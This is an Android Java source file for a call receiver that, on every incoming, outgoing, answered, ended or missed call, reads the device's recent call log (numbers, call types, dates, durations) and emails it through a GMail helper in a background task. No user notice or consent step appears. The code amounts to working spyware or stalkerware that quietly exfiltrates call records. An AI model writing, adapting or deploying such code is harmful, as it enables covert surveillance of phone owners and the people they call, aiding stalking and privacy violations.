package com.digitstory.testapplication.Services;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.digitstory.testapplication.Utils.Config;
import com.digitstory.testapplication.Utils.Event;
import com.digitstory.testapplication.Utils.GMail;

import java.util.Date;

public class CallReceiver extends PhonecallReceiver {

    @Override
    protected void onIncomingCallReceived(Context ctx, String number, Date start)
    {
        String logs = getCallDetails(ctx);
        sendMail(logs, number, Event.ON_INCOMING_CALL_RECEIVED, ctx);
    }

    @Override
    protected void onIncomingCallAnswered(Context ctx, String number, Date start)
    {
        String logs = getCallDetails(ctx);
        sendMail(logs, number, Event.ON_INCOMING_CALL_ANSWERED, ctx);
    }

    @Override
    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end)
    {
        String logs = getCallDetails(ctx);
        sendMail(logs, number, Event.ON_INCOMING_CALL_ENDED, ctx);
    }

    @Override
    protected void onOutgoingCallStarted(Context ctx, String number, Date start)
    {
        String logs = getCallDetails(ctx);
        sendMail(logs, number, Event.ON_OUTGOING_CALL_STARTED, ctx);
    } 

    @Override 
    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end)
    {
        String logs = getCallDetails(ctx);
        sendMail(logs, number, Event.ON_OUTGOING_CALL_ENDED, ctx);
    }

    @Override
    protected void onMissedCall(Context ctx, String number, Date start)
    {
        String logs = getCallDetails(ctx);
        sendMail(logs, number, Event.ON_MISSED_CALL, ctx);
    }

    private void sendMail(String logs, String number, String event, Context context) {
        final String emailBody = event + ":" + logs;

        try {
            GMail gmail = new GMail(null, null, null, number, emailBody);
            RunAsyncTask raTask = new RunAsyncTask(gmail, context);
            raTask.execute("CallReceiver");
        } catch (Exception e) {
            Log.e(Config.TAG, e.getMessage(), e);
        }
    }



    private  String getCallDetails(Context context) {
        StringBuffer stringBuffer = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return "";
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int index = 0 ;

        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            if(index == Config.NUM_OF_CALL_LOGS)
            {
                break;
            }
            ++index;
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();

    }

}